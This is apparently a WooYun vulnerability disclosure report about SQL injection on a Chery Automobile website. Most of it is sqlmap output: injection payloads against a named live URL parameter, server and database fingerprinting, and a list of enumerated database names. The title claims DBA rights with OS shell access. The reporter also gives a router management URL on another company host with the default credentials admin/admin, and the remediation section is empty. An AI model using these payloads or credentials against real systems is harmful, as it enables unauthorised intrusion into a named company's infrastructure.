wybug_title: 奇瑞汽车某站点存在SQL注入（DBA权限可执行os-shell命令）
wybug_status: 未联系到厂商或者厂商积极忽略
wybug_detail:
漏洞详情 披露状态：   									2016-04-13：	积极联系厂商并且等待厂商认领中，细节不对外公开									2016-05-28：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 奇瑞汽车某站点存在SQL注入（DBA权限-可执行os-shell命令） 详细说明：  赠送一个H3C路由器的web管理弱口令admin admin
http://ordosles.mychery.com/wcn/frame/.x
   漏洞证明：  
http://d1.mychery.com/xsgs/list.asp?id=179






Parameter: id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=179 AND 4567=4567    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: id=179 AND 3228=CONVERT(INT,(SELECT CHAR(113)+CHAR(120)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (3228=3228) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(120)+CHAR(106)+CHAR(113)))    Type: inline query    Title: Microsoft SQL Server/Sybase inline queries    Payload: id=(SELECT CHAR(113)+CHAR(120)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4738=4738) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(120)+CHAR(106)+CHAR(113))    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: id=179;WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: id=179 WAITFOR DELAY '0:0:5'    Type: UNION query    Title: Generic UNION query (NULL) - 16 columns    Payload: id=179 UNION ALL SELECT NULL,NULL,NULL,CHAR(113)+CHAR(120)+CHAR(98)+CHAR(122)+CHAR(113)+CHAR(119)+CHAR(79)+CHAR(90)+CHAR(115)+CHAR(114)+CHAR(69)+CHAR(71)+CHAR(98)+CHAR(97)+CHAR(76)+CHAR(113)+CHAR(113)+CHAR(120)+CHAR(106)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-----[23:54:32] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft SQL Server 2000[23:54:32] [INFO] fetching database names[23:54:32] [INFO] the SQL query used returns 14 entries[23:54:32] [INFO] resumed: A1[23:54:32] [INFO] resumed: KRTMS[23:54:32] [INFO] resumed: master[23:54:32] [INFO] resumed: model[23:54:32] [INFO] resumed: msdb[23:54:32] [INFO] resumed: Northwind[23:54:32] [INFO] resumed: pubs[23:54:32] [INFO] resumed: QYTMS[23:54:32] [INFO] resumed: RTMS[23:54:32] [INFO] resumed: tempdb[23:54:32] [INFO] resumed: TMS[23:54:32] [INFO] resumed: WCTMS[23:54:32] [INFO] resumed: WLTMS[23:54:32] [INFO] resumed: XSGSTMSavailable databases [14]:[*] A1[*] KRTMS[*] master[*] model[*] msdb[*] Northwind[*] pubs[*] QYTMS[*] RTMS[*] tempdb[*] TMS[*] WCTMS[*] WLTMS[*] XSGSTMS   修复方案：     版权声明：转载请注明来源 Miko@乌云
